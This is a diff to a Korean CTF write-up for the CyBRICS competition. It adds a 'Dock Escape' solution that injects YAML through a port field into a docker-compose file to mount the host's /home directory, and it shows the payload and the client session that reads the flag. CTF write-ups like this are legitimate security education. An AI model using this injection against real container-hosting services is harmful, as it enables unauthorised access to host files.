@@ -10,6 +10,7 @@ with team `ROKA`. (198 / 775)
 [Honey, Help! (rebyC, Baby, 10 pts)](#honey-help-rebyc-baby-10-pts)  
 [Paranoid (Network, Easy, 50 pts)](#paranoid-network-easy-50-pts)  
 [Tone (Forensic, Baby, 10 pts)](#tone-forensic-baby-10-pts)  
+[Dock Escape (CTB, Easy, 151 pts)](#dock-escape-ctb-easy-151-pts)  
 
 # Mic Check (Cyber, Baby, 10 pts)
 > Have you read the [game rules](https://cybrics.net/rules)? There's a flag there.  
@@ -405,4 +406,35 @@ Audacity를 열어 mp3를 드래그 하면 파형이 나온다. 조금만 확대
 `222 999 22 777 444 222 7777 7777 33 222 777 33 8 8 666 66 2 555 333 555 2 4`  
 이를 키패드의 문자와 연결시키면 플래그가 나온다.  
 flag : `cybrics{secrettonalflag}`
+
+
+# Dock Escape (CTB, Easy, 151 pts)
+
+> We want you to get a flag from hosting server. Flag path is /home/flag  
+> http://95.179.188.234:8080/  
+
+호스팅 서버에 있는 /home/flag를 갖고싶다고 한다. 해당 링크로 들어가면 client code, 캡챠, port input이 있다. 우선 해당 홈페이지는 요청한 port 번호로 도커를 하나 자동으로 파준다. port 요청에는 캡챠 인증이 필요하며, 해당 도커에는 일반적으로 접근할 수 없고, client code를 통해서 접근할 수 있다.  
+
+정상적으로 이용하려면 input 값으로 9000 포트를 넣으면 `OK!`문구가 뜨며 도커가 생성된다. `python client.py 95.179.188.234 9000` 로 서버에 접근하면 파일을 열람할 수 있다.  
+
+port input에 `'`를 injection 해보면 아래와 같은 에러가 뜬다.
+``` javascript
+Error happened! Here is your log 
+The Compose file '/tmp/tmpDtZEJH/docker-compose.yml' is invalid because: services.JoGyXdcJTncsyiquFVouKqhlBdtFdHwe.ports is invalid: Invalid port "9000':12345", should be [[remote_ip:]remote_port[-remote_port]:]port[/protocol] 
+```
+해당 에러는 `docker-compose.yml`에서 발생한 에러이며, 내가 injection한 코드가 들어가있다. input값을 docker-compose 파일에 넣는듯 하다. 이를 이용하여 아래와 같이 새로운 injection 페이로드를 작성할 수 있다.  
+```
+1218:12345
+    volumes:
+        - /home:/g0pher #
+```
+위와 같이 컨테이너에 포워딩은 그대로 해주고, 1218포트로 포워딩 해준다. 그다음 flag가 있는 Host의 /home 디렉토리를 컨테이너의 /g0pher 디렉토리로 마운트한다. 뒷부분의 코드는 `#`을 이용하여 주석처리하면 yml파일에 injection을 할 수 있다. 위의 페이로드를 전송하면 컨테이너가 생성되고, 아래와 같이 client.py를 통해 접근하면 된다.
+``` bash
+root@raspberrypi:~# python2 client.py 95.179.188.234 1218
+Choose what you want to do(store, retreive):retreive
+file you want to retreive:/g0pher/flag
+cybrics{0dbceabb65128d70f92b70f9d63f277ceac7515c501ece4916d0f3aa65457872}
+Choose what you want to do(store, retreive):
+```
+flag : `cybrics{0dbceabb65128d70f92b70f9d63f277ceac7515c501ece4916d0f3aa65457872}`
 
